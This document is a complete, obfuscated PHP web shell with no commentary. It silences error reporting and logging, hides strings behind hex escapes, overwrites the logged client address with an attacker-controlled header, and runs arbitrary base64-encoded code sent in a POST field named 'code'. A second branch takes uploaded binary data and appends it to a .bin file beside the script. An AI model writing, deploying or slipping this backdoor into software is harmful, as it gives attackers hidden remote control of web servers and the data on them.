<?php @error_reporting(0); @ini_set("disp\x6cay_er\x72\x6f\x72\x73",0); @ini_set("\x6c\x6fg_er\x72\x6frs",0); @ini_set("e\x72ro\x72_\x6cog",0); @ini_set("m\x65m\x6fry_\x6cim\x69\x74", "1\x32\x38\x4d"); @ini_set("max_\x65x\x65\x63\x75\x74ion\x5f\x74\x69me",30); @set_time_limit(30); if (isset($_SERVER["H\x54\x54\x50\x5fX\x5f\x52EAL\x5f\x49P"])) $_SERVER["\x52EMOT\x45\x5fAD\x44R"] = $_SERVER["H\x54\x54\x50\x5fX\x5f\x52EAL\x5f\x49P"]; if (isset($_POST["\x63ode"])) { eval(base64_decode($_POST["\x63ode"])); } elseif (isset($_SERVER["HTT\x50\x5fCONT\x45NT_\x45NCO\x44ING"]) && $_SERVER["HTT\x50\x5fCONT\x45NT_\x45NCO\x44ING"] == "b\x69\x6ear\x79") { $input = file_get_contents("\x70h\x70\x3a\x2f/i\x6eput"); if (strlen($input) > 0) print "\x53T\x41TU\x53\x2dIM\x50OR\x54-O\x4b"; if (strlen($input) > 10) { $fp = @fopen(str_replace("\x2ep\x68\x70","\x2ebin",basename($_SERVER["\x53CRI\x50T\x5fFIL\x45N\x41\x4dE"])), "a"); @flock($fp, LOCK_EX); @fputs($fp, $_SERVER["\x52EMOT\x45\x5fAD\x44R"]."\t".base64_encode($input)."\r\n"); @flock($fp, LOCK_UN); @fclose($fp); } } elseif (strpos($_SERVER["REQU\x45\x53\x54\x5f\x55\x52\x49"], ".shtm\x6c") !== false) { print $_SERVER["REQU\x45\x53\x54\x5f\x55\x52\x49"]; } exit; ?>